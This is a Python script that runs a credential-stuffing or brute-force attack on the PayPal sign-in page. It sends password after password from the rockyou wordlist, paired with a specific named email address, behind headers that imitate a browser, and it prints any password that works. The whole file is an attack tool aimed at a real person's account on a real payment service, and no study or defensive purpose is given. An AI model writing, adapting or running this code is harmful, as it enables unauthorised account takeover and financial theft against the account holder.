import requests
import time

# Replace these with your actual login URL and email
login_url = "https://www.paypal.com/signin?locale.x=nl_NL"
email = "marylinelelei@gmail.co.uk"
wordlist_path = "/path/to/rockyou.txt"  # e.g., /usr/share/wordlists/rockyou.txt

# Set headers to mimic a browser
headers = {
    "Host": "www.paypal.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
    "Accept-Language": "en-GB,en;q=0.9",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "https://www.paypal.com/signin?locale.x=nl_NL"
}

# Load passwords from a file
with open(wordlist_path, "r") as f:
    passwords = [line.strip() for line in f if line.strip()]

# Try each password
for pwd in passwords:
    payload = {
        "login": email,
        "password": pwd,
        "remember_me": "true"
    }

    # Send POST request to login
    response = requests.post(login_url, headers=headers, data=payload)

    # Validate login success
    if response.status_code == 200:
        # Optional: Check for specific content in the response (e.g., a success message)
        if "Welcome" in response.text or "Login successful" in response.text:
            print(f"[SUCCESS] Password found: {pwd}")
            print(f"You can now log in using the email: {email} and password: {pwd}")
            break
        else:
            print(f"[TRYING] Password: {pwd} | Status: {response.status_code} | Content: {response.text}")
    else:
        print(f"[TRYING] Password: {pwd} | Status: {response.status_code}")
        time.sleep(0.5)
